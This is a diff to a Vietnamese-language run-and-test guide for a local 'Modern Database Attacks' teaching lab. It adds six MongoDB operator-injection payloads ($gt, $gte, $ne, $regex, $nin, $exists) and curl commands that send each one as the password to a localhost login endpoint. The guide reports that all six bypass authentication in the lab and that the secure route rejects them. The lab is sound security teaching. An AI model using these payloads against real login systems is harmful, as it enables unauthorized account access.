@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="color-scheme" content="light">
-  <title>Hướng dẫn chạy, truy cập và kiểm thử · Modern Database Attacks</title>
+  <title>Documentation · Modern Database Attacks</title>
   <style>
 :root {
   color-scheme: light;
@@ -212,11 +212,18 @@ docker compose -f docker-compose.yml -f docker-compose.lab.yml up --build -d
 docker compose -f docker-compose.yml -f docker-compose.lab.yml run --rm app node scripts/seed.js --lab
 </code></pre>
 <p>Sau đó mở lại <code>http://127.0.0.1:3000</code>, chọn <code>Local lab observation</code>.</p>
-<p>Hai payload trên giao diện:</p>
+<p>Các payload operator trên giao diện:</p>
 <ul>
-<li>Assignment-shaped: <code>{"gt":""}</code> — thường trả <code>401</code>.</li>
-<li>MongoDB operator: <code>{"$gt":""}</code> — trong MongoDB lab hiện tại trả <code>200</code> và <code>authenticated: true</code>.</li>
+<li><code>{"$gt":""}</code> — Greater than empty.</li>
+<li><code>{"$gte":""}</code> — Greater than or equal to empty.</li>
+<li><code>{"$ne":"not-the-password"}</code> — Not equal.</li>
+<li><code>{"$regex":".*"}</code> — Regex match bất kỳ chuỗi nào.</li>
+<li><code>{"$nin":["not-the-password"]}</code> — Giá trị không nằm trong danh sách.</li>
+<li><code>{"$exists":true}</code> — Field password tồn tại.</li>
 </ul>
+<p>Trong lab local, sáu payload trên đều trả <code>200</code> và <code>authenticated: true</code> dù
+không nhập password dạng string. Secure route phải chặn tất cả object này với
+<code>400 INVALID_INPUT</code>.</p>
 <p>Đây chỉ là kết quả của database local hiện tại, không phải kết luận cho mọi hệ thống MongoDB.</p>
 <h2 id="5-kiem-thu-tu-ong-trong-docker">5. Kiểm thử tự động trong Docker</h2>
 <p>Dockerfile là runtime image nên không copy thư mục <code>tests</code>. Mount thư mục test ở chế độ read-only khi chạy test:</p>
@@ -229,9 +236,9 @@ docker compose -f docker-compose.yml -f docker-compose.lab.yml run --rm -v &quot
 </code></pre>
 <p>Kết quả baseline đã xác nhận:</p>
 <ul>
-<li>Unit + security-boundary: <code>11/11 pass</code>.</li>
+<li>Unit + security-boundary: <code>12/12 pass</code>.</li>
 <li>MongoDB integration: <code>1/1 pass</code>.</li>
-<li>Tổng cộng: <code>12/12 pass</code>.</li>
+<li>Tổng cộng: <code>13/13 pass</code>.</li>
 </ul>
 <p>Kiểm tra dependency:</p>
 <pre><code class="language-powershell">docker compose run --rm app npm audit --omit=dev --audit-level=moderate
@@ -260,6 +267,23 @@ curl.exe -i -X POST http://127.0.0.1:3000/api/auth/login `
 curl.exe -i -X POST http://127.0.0.1:3000/api/lab/login-observation `
   -H &quot;Content-Type: application/json&quot; `
   -d '{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:{&quot;$gt&quot;:&quot;&quot;}}'
+
+# Các operator lab khác: mỗi request thường trả 200
+curl.exe -i -X POST http://127.0.0.1:3000/api/lab/login-observation `
+  -H &quot;Content-Type: application/json&quot; `
+  -d '{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:{&quot;$gte&quot;:&quot;&quot;}}'
+curl.exe -i -X POST http://127.0.0.1:3000/api/lab/login-observation `
+  -H &quot;Content-Type: application/json&quot; `
+  -d '{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;not-the-password&quot;}}'
+curl.exe -i -X POST http://127.0.0.1:3000/api/lab/login-observation `
+  -H &quot;Content-Type: application/json&quot; `
+  -d '{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;.*&quot;}}'
+curl.exe -i -X POST http://127.0.0.1:3000/api/lab/login-observation `
+  -H &quot;Content-Type: application/json&quot; `
+  -d '{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:{&quot;$nin&quot;:[&quot;not-the-password&quot;]}}'
+curl.exe -i -X POST http://127.0.0.1:3000/api/lab/login-observation `
+  -H &quot;Content-Type: application/json&quot; `
+  -d '{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:{&quot;$exists&quot;:true}}'
 
 # JSON hỏng: 400 INVALID_JSON
 curl.exe -i -X POST http://127.0.0.1:3000/api/auth/login `
@@ -316,7 +340,8 @@ curl.exe -i -X POST http://127.0.0.1:3000/api/auth/login `
 <li>Chọn <code>Secure comparison</code>, dùng <code>alice</code> và password secure, bấm Submit; kết quả phải là HTTP <code>200</code>.</li>
 <li>Nhập sai password; kết quả phải là HTTP <code>401</code>.</li>
 <li>Chuyển sang <code>Local lab observation</code>; password input được thay bằng dropdown payload.</li>
-<li>Gửi variant <code>{"gt":""}</code> rồi <code>{"$gt":""}</code>; kiểm tra request hiển thị là object, không phải escaped string.</li>
+<li>Gửi lần lượt sáu operator variant; kiểm tra mỗi request hiển thị là object,
+   không phải escaped string, và kết quả lab là <code>authenticated: true</code>.</li>
 <li>Sau mỗi lần submit, password field phải được xóa.</li>
 <li>Thu nhỏ cửa sổ khoảng <code>375x812</code> để kiểm tra layout mobile.</li>
 </ol>
@@ -401,7 +426,7 @@ docker inspect modern-database-attacks-mongodb
 <li>Project không tạo persistent session; <code>authenticated: true</code> chỉ là marker của lab demo.</li>
 </ul>
     </main>
-    <p class="footer">Generated from RUN_AND_TEST.md. Keep the Markdown source for edits.</p>
+    <p class="footer">Generated from Markdown. Keep the Markdown source for edits.</p>
   </div>
 </body>
 </html>
